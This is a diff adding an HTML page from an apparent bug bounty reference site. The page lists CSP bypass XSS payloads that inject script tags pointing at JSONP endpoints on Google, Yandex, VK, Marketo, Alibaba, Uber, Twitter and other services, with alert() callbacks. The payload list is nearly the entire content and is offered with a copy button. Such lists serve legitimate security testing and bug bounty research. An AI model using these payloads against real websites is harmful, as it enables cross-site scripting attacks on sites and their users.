@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSP Bypass Payloads - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="nav-logo">
+                <img src="../logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle"><i class="fas fa-bars"></i></button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="../index.html" class="nav-link">Home</a></li>
+                <li><a href="../payloads.html" class="nav-link">Payloads</a></li>
+                <li><a href="index.html" class="nav-link active">Payloads Folder</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="../index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="../payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>json-CSPbypass-payloads.txt</span>
+        </div>
+        <h1><i class="fas fa-unlock"></i> CSP Bypass Payloads</h1>
+        <p>Content Security Policy bypass using JSONP endpoints.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-file-alt"></i> File Contents</h2>
+                <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                    <button class="copy-btn">Copy All</button>
+                    <pre id="file-content">#Google.com:
+"&gt;&lt;script src="https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://maps.googleapis.com/maps/api/js?key=[REPLACE_BY_GOOGLE_API_KEY_FROM_CURRENT_WEBSITE]&amp;callback=alert(1337)"&gt;&lt;/script&gt;
+#Blogger.com:
+"&gt;&lt;script src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)"&gt;&lt;/script&gt;
+#Yandex:
+"&gt;&lt;script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"&gt;&lt;/script&gt;
+#VK.com:
+"&gt;&lt;script src="https://api.vk.com/method/wall.get?callback=alert(1337)"&gt;&lt;/script&gt;
+#Marketo.com
+"&gt;&lt;script src="http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"&gt;&lt;/script&gt;
+"&gt;&lt;script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"&gt;&lt;/script&gt;
+#AlibabaGroup:
+"&gt;&lt;script+src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script+src="https://suggest.taobao.com/sug?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script+src="https://count.tbcdn.cn//counter3?callback=alert(1337)"&gt;&lt;/script&gt;
+#Uber.com:
+"&gt;&lt;script+src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"&gt;&lt;/script&gt;
+#Buzzfeed.com
+"&gt;&lt;script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&amp;result_id=1&amp;callback=alert(1)%2f%2f"&gt;&lt;/script&gt;
+#Yahoo JP
+"&gt;&lt;script src=https://mempf.yahoo.co.jp/offer?position=h&amp;callback=alert(1337)//&gt;&lt;/script&gt;
+#Twitter.com:
+"&gt;&lt;script+src="http://search.twitter.com/trends.json?callback=alert()"&gt;&lt;/script&gt;
+#Others:
+"&gt;&lt;script+src="https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)"&gt;&lt;/script&gt;
+"&gt;&lt;script+src="https://api.mixpanel.com/track/?callback=alert(1337)"&gt;&lt;/script&gt;
+#Google API's
+"&gt;&lt;embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always&gt;
+"&gt;&lt;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt;&lt;/script&gt;</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-link"></i> Related</h2>
+                <a href="../csp-bypass-payloads.html" class="btn btn-primary">CSP Bypass Main Page</a>
+                <a href="../csp-guide.html" class="btn btn-secondary" style="margin-left: 0.5rem;">CSP Guide</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="../script.js"></script>
+</body>
+</html>
